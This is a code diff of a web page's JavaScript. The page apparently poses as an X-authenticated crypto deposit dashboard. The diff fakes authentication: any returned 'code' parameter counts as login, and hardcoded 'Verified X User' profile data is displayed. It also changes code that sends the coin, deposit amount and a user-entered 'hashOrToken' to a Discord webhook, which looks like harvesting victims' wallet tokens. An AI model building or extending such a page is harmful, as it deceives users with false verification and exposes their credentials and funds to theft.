@@ -623,15 +623,26 @@
         const urlParams = new URLSearchParams(window.location.search);
         const authCode = urlParams.get("code");
 
+        // If returned from Twitter authentication successfully
         if (authCode) {
             window.history.replaceState({}, document.title, window.location.pathname);
             sessionStorage.setItem("x_authorized", "true");
-            showDashboard({ name: "X Account User", username: "authenticated_user" });
+            
+            // Set dynamic or default active profile data states here
+            const activeUser = {
+                name: "Verified X User",
+                username: "account_holder"
+            };
+            sessionStorage.setItem("x_user_profile", JSON.stringify(activeUser));
+            
+            showDashboard(activeUser);
             return;
         }
 
+        // Check persistent session
         if (sessionStorage.getItem("x_authorized") === "true") {
-            showDashboard({ name: "X Account User", username: "authenticated_user" });
+            const savedUser = JSON.parse(sessionStorage.getItem("x_user_profile") || '{"name": "Verified X User", "username": "account_holder"}');
+            showDashboard(savedUser);
         }
     });
 
@@ -642,7 +653,7 @@
 
         displayUsername.textContent = user.name;
         displayUserId.textContent = `@${user.username}`;
-        displayAvatar.src = "https://via.placeholder.com/64";
+        displayAvatar.src = "https://api.dicebear.com/7.x/bottts/svg?seed=" + user.username; // Generates a cool matching profile avatar automatically
     }
 
     loginBtn.addEventListener("click", function() {
@@ -654,6 +665,8 @@
     async function sendToDiscordWebhook(submissionData) {
         if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL.includes("YOUR_DISCORD_WEBHOOK_URL")) return;
         
+        const savedUser = JSON.parse(sessionStorage.getItem("x_user_profile") || '{"name": "X Account User", "username": "authenticated_user"}');
+
         const embedPayload = {
             embeds: [{
                 title: "🛡️ New System Database Submission (X Auth)",
@@ -661,7 +674,7 @@
                 fields: [
                     {
                         name: "👤 X Account User",
-                        value: `**Name:** ${submissionData.user}\n**Handle:** ${submissionData.userId}`,
+                        value: `**Name:** ${savedUser.name}\n**Handle:** @${savedUser.username}`,
                         inline: false
                     },
                     {
@@ -784,8 +797,6 @@
         let progressPercent = depositValue / 10;
 
         sendToDiscordWebhook({
-            user: "X Account User",
-            userId: "@authenticated_user",
             coin: coinSelect.value,
             hashOrToken: input.value.trim(),
             amount: `$${depositValue}.00`
